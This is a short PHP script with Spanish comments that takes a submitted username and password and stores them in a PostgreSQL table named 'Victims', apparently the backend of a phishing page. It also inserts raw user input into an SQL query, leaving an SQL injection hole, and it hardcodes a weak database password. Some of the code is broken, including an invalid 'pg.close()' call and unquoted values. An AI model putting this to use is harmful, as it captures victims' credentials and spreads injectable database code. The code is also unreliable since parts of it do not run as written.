<?php

$id = 1;
$usuario = $_POST['user'];
$contrasena = $_POST['pass'];

//Conectándose a la base de datos
$dbconection = pg_connect("host=localhost port=25000 dbname=DB_Proyecto user=DB_Proyecto password=1234")
or die ("Hubo un error al conectarse con la base de datos.").preg_last_error();

//Petición de registro
$query = ("INSERT INTO Victims (Id, Username, Password) VALUES ($id, $usuario, $contrasena)");

//Registro
$registro = pg_query($dbconection, $query) or die ('Error al ingresar, intente de nuevo.').pg_last_error();

pg.close();

?>